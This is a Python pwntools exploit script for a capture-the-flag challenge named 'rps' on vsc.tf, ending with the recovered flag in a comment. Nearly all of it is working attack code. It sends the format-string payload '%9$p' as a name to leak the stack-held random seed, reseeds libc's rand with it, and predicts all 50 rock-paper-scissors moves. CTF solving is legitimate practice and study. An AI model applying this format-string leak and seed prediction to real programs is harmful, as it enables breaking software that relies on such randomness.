#!/usr/bin/python3

from pwn import *
from ctypes import CDLL
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
exe = ELF('rps', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('vsc.tf', 3094)
else:
        p = process(exe.path)

GDB()
rps = ['p', 's', 'r']
sla(b'name: ', b'%9$p')
p.recvuntil(b'Hi ')
seed = int(p.recvline(keepends=False).decode(), 16) & 0xffffffff
info("seed: " + hex(seed))
libc.srand(seed)
for i in range(0, 50):
        sla(b'(r/p/s): ', rps[libc.rand()%3])  
         
p.interactive()
# vsctf{Wh4t_da_h3ck_br0_gu355_g0d_kn0ws_4ll_my_m0v3s_:(((}